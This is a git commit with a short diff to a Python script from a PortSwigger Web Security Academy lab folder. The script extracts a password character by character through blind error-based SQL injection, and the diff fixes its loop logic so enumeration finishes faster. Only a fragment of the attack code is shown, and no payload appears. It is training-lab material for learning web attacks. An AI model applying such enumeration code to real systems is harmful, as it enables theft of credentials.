23c9e87887e358798ab8a3955b7240d88597b004
Julio Ribeiro <julio.ribeiro303@gmail.com>
2023-01-22 12:34:56 -0300

    fix logic to make enumeration faster

--- portswigger-web-security-academy/sqli/blind_sqli_password_enumerator_error.py
+++ portswigger-web-security-academy/sqli/blind_sqli_password_enumerator_error.py
@@ -42,9 +42,10 @@ def get_password(url, session, tracking_id, password_length, characters, error_r
       if response != error_response_code:
         password += character
         print(f"{position}/{password_length} characters...")
-        continue
-      if len(password) == password_length:
-        return [True, password]
+        break
+  
+  if len(password) == password_length:
+    return [True, password]
   
   print("failed to brute force the password")
   return [False, None]
